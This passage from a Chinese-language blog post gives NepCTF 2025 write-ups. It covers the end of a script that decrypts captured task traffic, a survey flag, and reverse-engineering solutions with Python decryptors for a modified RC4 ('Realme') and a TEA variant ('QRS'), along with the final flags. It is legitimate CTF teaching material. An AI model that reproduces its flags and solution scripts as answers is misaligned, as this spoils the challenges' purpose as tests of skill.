b&quot;abcdefghijklmnop&quot;</span><br><span class="line"></span><br><span class="line">        # 执行解密</span><br><span class="line">        decrypted_data = decrypt(encrypted_content, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line"></span><br><span class="line">        if decrypted_data:</span><br><span class="line">            # 解析解密后的数据</span><br><span class="line">            counter = int.from_bytes(decrypted_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">            task_length = int.from_bytes(decrypted_data[4:8], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">            task_type = int.from_bytes(decrypted_data[8:12], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">            task_data = decrypted_data[12:12 + task_length]</span><br><span class="line"></span><br><span class="line">            # 输出结果</span><br><span class="line">            print(f&quot;counter: &#123;counter&#125;&quot;)</span><br><span class="line">            print(f&quot;任务返回长度: &#123;task_length&#125;&quot;)</span><br><span class="line">            print(f&quot;任务输出类型: &#123;task_type&#125;&quot;)</span><br><span class="line">            print(f&quot;任务数据: &#123;task_data&#125;&quot;)</span><br><span class="line">            print(&quot;完整解密数据:&quot;)</span><br><span class="line">            hexdump.hexdump(decrypted_data)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;解密过程中发生错误: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="/2025-07-28-10-23-18-image.png" alt="2025-07-28-10-23-18-image.png"></p>
<p>敏感信息：5c1eb2c4-0b85-491f-8d50-4e965b9d8a43</p>
<p>组合信息得到最终flag：</p>
<p>NepCTF{JohnDoe_192.168.27.132:12580_5c1eb2c4-0b85-491f-8d50-4e965b9d8a43}</p>
<h2 id="问卷！！！"><a href="#问卷！！！" class="headerlink" title="问卷！！！"></a><strong>问卷！！！</strong></h2><p>给了个网址<a target="_blank" rel="noopener" href="https://wj.qq.com/s/23296654/e9fc/">https://wj.qq.com/s/23296654/e9fc/</a></p>
<p>直接秒啦！！！</p>
<p>NepCTF{W3lcome2025NepCTF_SeeYouNexT2026!}</p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Realme"><a href="#Realme" class="headerlink" title="Realme"></a><strong>Realme</strong></h2><p>先用ida打开主函数</p>
<p><img src="/image%2016.png" alt="image.png"></p>
<p>发现加密逻辑</p>
<p><img src="/image%2017.png" alt="image.png"></p>
<p><img src="/image%2018.png" alt="image.png"></p>
<p>发现是rc4，但是被魔改了，两处魔改点，但是最后是取模，无法还原密文，显然不是正确的加密逻辑，对照了题目realme，所以直接动调找到正确的加密逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">void *__cdecl sub_40B000(char *a1, char *a2, unsigned <span class="built_in">int</span> a3) &#123;</span><br><span class="line">    void *result; // eax</span><br><span class="line">    char v4; // [esp+D3h] [ebp-129h]</span><br><span class="line">    char v5[<span class="number">264</span>]; // [esp+DCh] [ebp-120h] BYREF </span><br><span class="line">    <span class="built_in">int</span> v6; // [esp+1E4h] [ebp-18h]</span><br><span class="line">    <span class="built_in">int</span> i; // [esp+1F0h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    result = memset(v5, <span class="number">0</span>, 0x100u); </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        a1[i] = i ^ <span class="number">0xCF</span>;</span><br><span class="line">        v5[i] = a2[i % a3];</span><br><span class="line">        result = (void *)(i + <span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">        v6 = ((unsigned __int8)v5[i] + v6 + (unsigned __int8)a1[i]) % <span class="number">256</span>; </span><br><span class="line">        v4 = a1[i];</span><br><span class="line">        a1[i] = a1[v6];</span><br><span class="line">        a1[v6] = v4 ^ <span class="number">0xAD</span>;</span><br><span class="line">        result = (void *)(i + <span class="number">1</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned <span class="built_in">int</span> __cdecl sub_401A60(char *a1, char *a2, unsigned <span class="built_in">int</span> a3) &#123;</span><br><span class="line">    unsigned <span class="built_in">int</span> result; // eax </span><br><span class="line">    <span class="built_in">int</span> v4; // ecx</span><br><span class="line">    char v5; // al</span><br><span class="line">    char v6; // [esp+D3h] [ebp-35h]</span><br><span class="line">    unsigned <span class="built_in">int</span> i; // [esp+DCh] [ebp-2Ch] </span><br><span class="line">    <span class="built_in">int</span> v8; // [esp+F4h] [ebp-14h]</span><br><span class="line">    <span class="built_in">int</span> v9; // [esp+100h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">    __CheckForDebuggerJustMyCode(&amp;unk_41200F);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ; ++i) &#123;</span><br><span class="line">        result = i;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= a3)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v8 = (v8 + v9 * (unsigned __int8)a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        v6 = a1[v9];</span><br><span class="line">        a1[v9] = a1[v8];</span><br><span class="line">        a1[v8] = v6;</span><br><span class="line">        v4 = ((unsigned __int8)a1[v8] + (unsigned __int8)a1[v9]) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span>)</span><br><span class="line">            v5 = a1[v4] + a2[i];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v5 = a2[i] - a1[v4]; </span><br><span class="line">        a2[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写个exp解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mixer</span>(<span class="params">seed: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytearray</span>:</span><br><span class="line">    box = <span class="built_in">bytearray</span>(((n ^ <span class="number">0xCF</span>) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    pad = <span class="built_in">bytearray</span>(seed[i % <span class="built_in">len</span>(seed)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    ptr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        ptr = (ptr + pad[idx] + box[idx]) &amp; <span class="number">0xFF</span></span><br><span class="line">        box[idx], box[ptr] = box[ptr], box[idx]</span><br><span class="line">        box[ptr] ^= <span class="number">0xAD</span></span><br><span class="line">    <span class="keyword">return</span> box</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">blob: <span class="built_in">bytes</span>, token: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    state = mixer(token)</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    result = <span class="built_in">bytearray</span>(blob)</span><br><span class="line">    <span class="keyword">for</span> pos, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(blob):</span><br><span class="line">        a = (a + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        b = (b + a * state[a]) &amp; <span class="number">0xFF</span></span><br><span class="line">        state[a], state[b] = state[b], state[a]</span><br><span class="line">        t = (state[a] + state[b]) &amp; <span class="number">0xFF</span></span><br><span class="line">        delta = state[t]</span><br><span class="line">        <span class="keyword">if</span> pos &amp; <span class="number">1</span>:</span><br><span class="line">            result[pos] = (ch - delta) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[pos] = (ch + delta) &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key_material = <span class="string">b&quot;Y0u_Can&#x27;t_F1nd_Me!&quot;</span></span><br><span class="line">    secret_data = <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0xA2</span>, <span class="number">0x94</span>, <span class="number">0x2E</span>, <span class="number">0x8E</span>, <span class="number">0x5C</span>, <span class="number">0x95</span>, <span class="number">0x79</span>, <span class="number">0x16</span>,</span><br><span class="line">        <span class="number">0xE5</span>, <span class="number">0x36</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0xE8</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x78</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>,</span><br><span class="line">        <span class="number">0x36</span>, <span class="number">0xC8</span>, <span class="number">0x73</span>, <span class="number">0x1B</span>, <span class="number">0x65</span>, <span class="number">0x40</span>, <span class="number">0xB5</span>, <span class="number">0xD4</span>, <span class="number">0xE8</span>, <span class="number">0x9C</span>,</span><br><span class="line">        <span class="number">0x65</span>, <span class="number">0xF4</span>, <span class="number">0xBA</span>, <span class="number">0x62</span>, <span class="number">0xD0</span></span><br><span class="line">    ])</span><br><span class="line">    decoded = transform(secret_data, key_material)</span><br><span class="line">    <span class="built_in">print</span>(decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到NepCTF{Y0u_FiN1sH_Th1s_E3sy_Smc!!!}</p>
<h2 id="QRS"><a href="#QRS" class="headerlink" title="QRS"></a><strong>QRS</strong></h2><p>先用ida打开main函数</p>
<p><img src="/image%2019.png" alt="image.png"></p>
<p><img src="/image%2020.png" alt="image.png"></p>
<p>毛用没有，搜一下qrs，发现真main</p>
<p><img src="/image%2021.png" alt="image.png"></p>
<p>在QRS::e12c96f7a24fc73e1::axum_extract::b2a92c317a3cdec81发现tea算法</p>
<p><img src="/image%2022.png" alt="image.png"></p>
<p>接下来就是动调，因为给了符号表所以很好定位到0x68547369，跟踪xref一下获取密文密钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unsigned <span class="built_in">int</span> __deviceKey[<span class="number">2</span> &lt;&lt; <span class="number">1</span>] = &#123;</span><br><span class="line">    <span class="number">0x01234567</span>,</span><br><span class="line">    <span class="number">0x89ABCDEF</span>,</span><br><span class="line">    <span class="number">0x0FEDCBA9</span>,</span><br><span class="line">    <span class="number">0x76543210</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned <span class="built_in">int</span> __encodedResult[<span class="number">0x8</span>] = &#123;</span><br><span class="line">    <span class="number">0x083EA621</span>, <span class="number">0xC745973C</span>,</span><br><span class="line">    <span class="number">0xE3B77AE8</span>, <span class="number">0xCDEE8146</span>,</span><br><span class="line">    <span class="number">0x7DC86B96</span>, <span class="number">0x6B8C9D3B</span>,</span><br><span class="line">    <span class="number">0x79B14342</span>, <span class="number">0x2ECF0F0D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>写个exp解密即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_le</span>(<span class="params">data: <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(data[i:i+<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_le</span>(<span class="params">dwords</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(dw.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> dw <span class="keyword">in</span> dwords)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">v0, v1, k, rounds=<span class="number">0x30</span>, delta=<span class="number">0x68547369</span></span>):</span><br><span class="line">    sum_ = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        v1 = (v1 - (((v0 &lt;&lt; <span class="number">4</span> ^ v0 &gt;&gt; <span class="number">5</span>) + v0) ^ (k[(sum_ &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum_))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_ = (sum_ - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 = (v0 - (((v1 &lt;&lt; <span class="number">4</span> ^ v1 &gt;&gt; <span class="number">5</span>) + v1) ^ (k[sum_ &amp; <span class="number">3</span>] + sum_))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v0, v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = [<span class="number">0x01234567</span>, <span class="number">0x89ABCDEF</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span>]</span><br><span class="line">    ciphertext = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;21A63E083C9745C7E87AB7E34681EECD966BC87D3B9D8C6B4243B1790D0FCF2E&quot;</span>)</span><br><span class="line">    enc_words = bytes_to_dwords_le(ciphertext)</span><br><span class="line"></span><br><span class="line">    plain_words = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(enc_words), <span class="number">2</span>):</span><br><span class="line">        x, y = enc_words[i], enc_words[i+<span class="number">1</span>]</span><br><span class="line">        p0, p1 = decrypt_block(x, y, key)</span><br><span class="line">        plain_words.extend([p0, p1])</span><br><span class="line"></span><br><span class="line">    plaintext = dwords_to_bytes_le(plain_words)</span><br><span class="line">    <span class="built_in">print</span>(plaintext.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image%2023.png" alt="image.png"></p>
<p>得到NepCTF{a4747f82be106d3f8c4d747c744d7ee5}</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jiker666.github.io">Jiker.</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jiker666.github.io/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/">https://jiker666.github.io/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://jiker666.github.io" target="_blank">Jiker's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/07/29/2025nepctf-wp/" title="2025nepctf--wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2025nepctf--wp</div></div></div></a><a class="pagination-related" href="/2025/07/25/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jiker.</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NepCTF%E2%80%94%E2%80%94wp"><span class="toc-number">1.</span> <span class="toc-text">NepCTF——wp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaSeri"><span class="toc-number">2.1.</span> <span class="toc-text">JavaSeri</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyGooGooVVVY"><span class="toc-number">2.2.</span> <span class="toc-text">easyGooGooVVVY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RevengeGooGooVVVY"><span class="toc-number">2.3.</span> <span class="toc-text">RevengeGooGooVVVY</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">3.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Time"><span class="toc-number">3.1.</span> <span class="toc-text">Time</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nepsign"><span class="toc-number">4.1.</span> <span class="toc-text">Nepsign</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">5.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NepBotEvent"><span class="toc-number">5.1.</span> <span class="toc-text">NepBotEvent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SpeedMino"><span class="toc-number">5.2.</span> <span class="toc-text">SpeedMino</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%9C%8D%E5%B0%8F%E7%BE%8E"><span class="toc-number">5.3.</span> <span class="toc-text">客服小美</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E5%8D%B7%EF%BC%81%EF%BC%81%EF%BC%81"><span class="toc-number">5.4.</span> <span class="toc-text">问卷！！！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">6.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Realme"><span class="toc-number">6.1.</span> <span class="toc-text">Realme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#QRS"><span class="toc-number">6.2.</span> <span class="toc-text">QRS</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/NepCTF%E2%80%94%E2%80%94wp%2023ecfd63eb56801d861ffbd04c7dc873/" title="2025nepctf--wp">2025nepctf--wp</a><time datetime="2025-07-29T03:33:19.000Z" title="发表于 2025-07-29 11:33:19">2025-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/29/2025nepctf-wp/" title="2025nepctf--wp">2025nepctf--wp</a><time datetime="2025-07-29T03:33:19.000Z" title="发表于 2025-07-29 11:33:19">2025-07-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/25/hello-world/" title="Hello World">Hello World</a><time datetime="2025-07-25T06:05:47.580Z" title="发表于 2025-07-25 14:05:47">2025-07-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 By Jiker.</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>